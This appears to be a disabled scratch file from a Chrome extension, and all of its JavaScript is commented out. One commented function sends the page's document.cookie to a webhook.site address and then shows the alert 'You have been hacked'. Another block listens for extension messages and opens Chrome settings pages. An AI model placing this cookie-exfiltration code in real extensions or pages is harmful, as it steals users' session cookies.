
/* This doc is not necessary */

// console.log("Is this even 1working");
// redirectFunction = function() {
//     console.log("In the email function");
//     document.location="https://webhook.site/f9dfe567-64d0-4843-a01f-7d03ed2e53d9/?q="+document.cookie;
//     alert("You have been hacked");
// }
// console.log("Is this even working");
// redirectFunction();

// chrome.runtime.onMessage.addListener(
//     function(request, sender, sendResponse) {
//         if( request.message === "clicked_browser_action" ) {
//             var firstHref = $("a[href^='http']").eq(0).attr("href");

//             console.log(firstHref);

//             //chrome.runtime.sendMessage({"message": "open_new_tab", "url": "chrome://settings/clearBrowserData"});
//             chrome.runtime.sendMessage({"message": "open_new_tab", "url": "chrome://settings/siteData?search=Content"});
//         }
//     }
// );